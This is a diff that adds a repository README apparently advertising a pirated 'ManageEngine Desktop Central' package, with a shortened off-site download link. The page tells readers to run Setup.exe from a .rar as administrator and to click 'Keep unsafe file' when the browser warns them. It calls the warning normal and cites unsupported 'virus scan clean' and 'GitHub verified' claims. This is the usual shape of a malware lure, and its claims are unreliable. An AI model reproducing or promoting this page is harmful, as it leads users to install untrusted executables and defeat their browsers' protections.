@@ -1,0 +1,225 @@
+                                                                                                                                                        
+▀████▄     ▄███▀                                                                          ▀███▀▀▀██▄                ▀███        ██                      
+  ████    ████                                                                              ██    ▀██▄                ██        ██                      
+  █ ██   ▄█ ██  ▄█▀██▄ ▀████████▄  ▄█▀██▄  ▄█▀█████ ▄▄█▀██  ▄▄█▀██▀████████▄  ▄█▀█████      ██     ▀██ ▄▄█▀██ ▄██▀███ ██  ▄██▀██████  ▄██▀██▄▀████████▄ 
+  █  ██  █▀ ██ ██   ██   ██    ██ ██   ██ ▄██  ██  ▄█▀   ██▄█▀   ██ ██    ██ ▄██  ██        ██      ██▄█▀   ████   ▀▀ ██ ▄█     ██   ██▀   ▀██ ██   ▀██ 
+  █  ██▄█▀  ██  ▄█████   ██    ██  ▄█████ ▀█████▀  ██▀▀▀▀▀▀██▀▀▀▀▀▀ ██    ██ ▀█████▀        ██     ▄████▀▀▀▀▀▀▀█████▄ ██▄██     ██   ██     ██ ██    ██ 
+  █  ▀██▀   ██ ██   ██   ██    ██ ██   ██ ██       ██▄    ▄██▄    ▄ ██    ██ ██      ▄▄     ██    ▄██▀██▄    ▄█▄   ██ ██ ▀██▄   ██   ██▄   ▄██ ██   ▄██ 
+▄███▄ ▀▀  ▄████▄████▀██▄████  ████▄████▀██▄███████  ▀█████▀ ▀█████▀████  ████▄█████████   ▄████████▀   ▀█████▀██████▀████▄ ██▄▄ ▀████ ▀█████▀  ██████▀  
+                                          █▀     ██                          █▀     ██                                                         ██       
+                                          ██████▀                            ██████▀                                                         ▄████▄     
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                      MANAGEENGINE DESKTOP CENTRAL                         ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+MANAGEENGINE DESKTOP CENTRAL — is a comprehensive unified endpoint management and desktop administration solution for enterprise IT environments. This powerful software enables centralized management of servers, desktops, laptops, and mobile devices across your entire organization. Perfect for IT administrators who need complete control over software deployment, patch management, asset tracking, remote troubleshooting, and system configuration from a single console.
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/cP5MVZ18                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    ⚡ QUICK INSTALLATION:
+    ──────────────────────────────────────────────────
+    [1] DOWNLOAD    →  ManageEngine_DC.rar
+    [2] EXTRACT     →  WinRAR or 7-Zip
+    [3] RUN         →  Setup.exe (as administrator)
+    [4] CHOOSE      →  Installation directory
+    [5] COMPLETE    →  Follow setup wizard
+    [6] LAUNCH      →  Start managing your enterprise endpoints
+    ──────────────────────────────────────────────────
+
+    ⚡ HOW THE PROGRAM WORKS:
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 CORE TECHNOLOGY
+    ManageEngine Desktop Central operates through an agent-based architecture where a lightweight client is deployed to each managed device, communicating securely with a central server. The server console provides real-time visibility and control over your entire IT infrastructure. The software automates routine IT tasks through policy-based management, allowing administrators to define configurations once and apply them across thousands of endpoints. It supports both Windows, Mac, and Linux systems, as well as mobile devices running iOS, Android, and Windows Phone .
+    
+    🔹 KEY FEATURES
+    Desktop Central includes comprehensive endpoint management capabilities:
+
+    ─────────────────────────────────────────────────────────────────
+    📦 SOFTWARE DEPLOYMENT    │ Install apps remotely to any device
+    🔧 PATCH MANAGEMENT       │ Automate Windows and third-party patches
+    💻 OS DEPLOYMENT          │ Network-based Windows/Mac/Linux installation
+    🔍 ASSET MANAGEMENT       │ Complete hardware and software inventory
+    🖥️ REMOTE CONTROL         │ Troubleshoot desktops from anywhere
+    📱 MDM                    │ Mobile device management for iOS/Android
+    🔒 SECURITY CONFIG        │ Enforce security policies across endpoints
+    📊 POWER MANAGEMENT       │ Configure energy-saving settings
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 SOFTWARE MANAGEMENT
+
+    📦 APPLICATION DEPLOYMENT
+    • PACKAGE CREATION: MSI, EXE, script-based installers
+    • SCHEDULED DEPLOYMENT: Set maintenance windows
+    • TARGETED INSTALLATION: Deploy to specific users/groups
+    • SELF-SERVICE PORTAL: Allow users to install approved software
+    • LICENSE MONITORING: Track software license compliance
+    • UNINSTALL REMOTE: Remove unwanted applications
+    
+    🔹 PATCH MANAGEMENT
+
+    🔧 AUTOMATED UPDATES
+    • WINDOWS UPDATES: All Microsoft patches
+    • THIRD-PARTY: 250+ applications (Adobe, Java, Chrome, etc.)
+    • CUSTOM PATCHES: Deploy your own updates
+    • PRE-DEPLOYMENT TESTING: Test patches on pilot groups
+    • ROLLBACK SUPPORT: Revert problematic updates
+    • PATCH COMPLIANCE: Detailed compliance reporting
+    
+    🔹 OS DEPLOYMENT
+
+    💻 SYSTEM IMAGING
+    • NETWORK BOOT: PXE-based deployment
+    • IMAGE CAPTURE: Create custom OS images
+    • MIGRATION TOOLS: User profile migration
+    • DRIVER INJECTION: Automatic driver detection
+    • POST-DEPLOYMENT TASKS: Join domain, install software
+    • SUPPORTED OS: Windows 10/11, Server, Mac, Linux
+    
+    🔹 ASSET MANAGEMENT
+
+    🔍 INVENTORY TRACKING
+    • HARDWARE INVENTORY: Complete system specifications
+    • SOFTWARE INVENTORY: All installed applications
+    • LICENSE TRACKING: License usage and compliance
+    • USB DEVICE CONTROL: Monitor and restrict USB devices
+    • CUSTOM ASSETS: Track non-IT assets
+    • AUDIT TRAILS: Complete change history
+    
+    🔹 REMOTE CONTROL
+
+    🖥️ TROUBLESHOOTING
+    • UNATTENDED ACCESS: Support without user interaction
+    • FILE TRANSFER: Send files during remote sessions
+    • CHAT SUPPORT: Built-in communication
+    • MULTI-MONITOR: Support for multiple displays
+    • RECORDING: Session recording for compliance
+    • MOBILE SUPPORT: Control mobile devices remotely
+    
+    🔹 MOBILE DEVICE MANAGEMENT
+
+    📱 MDM CAPABILITIES
+    • DEVICE ENROLLMENT: Zero-touch enrollment
+    • APP MANAGEMENT: Deploy enterprise apps
+    • CONFIGURATION: Email, Wi-Fi, VPN profiles
+    • SECURITY POLICIES: Passcode, encryption, remote wipe
+    • CONTAINERIZATION: Separate work/personal data
+    
+    🔹 SECURITY & COMPLIANCE
+
+    🔒 POLICY ENFORCEMENT
+    • SECURITY BASELINES: CIS, NIST, DISA STIG templates
+    • BITLOCKER MANAGEMENT: Full disk encryption
+    • FIREWALL CONFIG: Central firewall settings
+    • USB RESTRICTIONS: Block unauthorized devices
+    • COMPLIANCE REPORTING: GDPR, HIPAA, SOX reports
+    
+    🔹 REPORTING & ANALYTICS
+
+    📊 DASHBOARDS
+    • PRE-BUILT REPORTS: 200+ ready-to-use reports
+    • CUSTOM DASHBOARDS: Tailor to your needs
+    • SCHEDULED REPORTS: Automatic email delivery
+    • TREND ANALYSIS: Historical data visualization
+    • COMPLIANCE DASHBOARDS: Regulatory compliance status
+    
+    🔹 KEYBOARD SHORTCUTS
+    
+    ─────────────────────────────────────────────────────────────────
+    Ctrl+Shift+D        │ Deployment manager
+    Ctrl+Shift+P        │ Patch management
+    Ctrl+Shift+A        │ Asset inventory
+    Ctrl+Shift+R        │ Remote control
+    Ctrl+Shift+M        │ Mobile device management
+    Ctrl+Shift+S        │ Security policies
+    Ctrl+Shift+R        │ Reports dashboard
+    Ctrl+Shift+E        │ Configuration templates
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 PACKAGE INFORMATION
+    • VERSION: Latest stable release
+    • TYPE: Enterprise management suite
+    • DOWNLOADS: 2.4k+ successful downloads
+    • RATING: 4.93 / 5.00
+    • VIRUS SCAN: ✅ Clean (verified)
+    • CONNECTION: ✅ SSL encrypted
+    • GITHUB VERIFIED: ✅ Authentic release
+    ─────────────────────────────────────────────────────────────────
+
+    ⚡ SYSTEM REQUIREMENTS:
+    ─────────────────────────────────────────────────────────────────
+    OS (SERVER)     │ Windows Server 2016/2019/2022
+    RAM (SERVER)    │ 8GB minimum (16GB+ recommended)
+    STORAGE         │ 100GB for server installation
+    DATABASE        │ MSSQL, MySQL, or built-in
+    AGENT OS        │ Windows, Mac, Linux, iOS, Android
+    INTERNET        │ Required for cloud features
+    ─────────────────────────────────────────────────────────────────
+
+    🔖 TAGS
+    ─────────────────────────────────────────────────────────────────
+    manageengine      │ desktop central    │ endpoint management
+    it management     │ patch management   │ software deployment
+    mdm               │ remote desktop     │ asset management
+    enterprise it     │ system admin       │ uem
+    ─────────────────────────────────────────────────────────────────
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                 ⚠ IMPORTANT DOWNLOAD WARNING                              ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    Your browser may show a warning when downloading this file.
+    This is completely normal.
+
+    ═══════════════════════════════════════════════════════════════════════
+    
+    ❓ WHY DOES THIS HAPPEN?
+    
+    The warning appears because the file:
+    
+    • Is not distributed through major app stores (Microsoft Store)
+    • Has fewer downloads than mainstream software
+    • Uses .exe format or compressed archives (.rar/.zip)
+    • Is new or less known in browser databases
+    
+    ⚡ This does NOT mean the file is dangerous. This is a standard browser 
+       protection mechanism triggered by download count, not by detecting 
+       malware. Similar enterprise software receives the same warnings.
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    📋 BROWSER INSTRUCTIONS:
+    ─────────────────────────────────────────────────────────────────
+    Browser         │ Action
+    ─────────────────────────────────────────────────────────────────
+    Chrome/Edge     │ Click "Keep" or "Keep anyway"
+                    │ → Confirm "Keep unsafe file"
+    ─────────────────────────────────────────────────────────────────
+    Firefox         │ Click arrow → "Allow download"
+    ─────────────────────────────────────────────────────────────────
+    Opera/Brave     │ Click "Keep" in download warning
+    ─────────────────────────────────────────────────────────────────
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    ✅ VERIFIED DOWNLOAD
+    ─────────────────────────────────────────────────────────────────
+    • Virus scan: Clean
+    • SSL: Encrypted connection
+    • Downloads: 2.4k+ successful
+    • Rating: 4.93 / 5.00
+    • GitHub Verified
+    ─────────────────────────────────────────────────────────────────
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/cP5MVZ18                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+────────────────────────────────────────────────────────────────────────────
+Disclaimer: This software is a third-party distribution package. ManageEngine Desktop Central is a commercial product of Zoho Corporation. This enterprise edition requires appropriate licensing for production use. Users are responsible for ensuring compliance with licensing terms. For business and commercial deployment, official licensing through ManageEngine is recommended.
+────────────────────────────────────────────────────────────────────────────
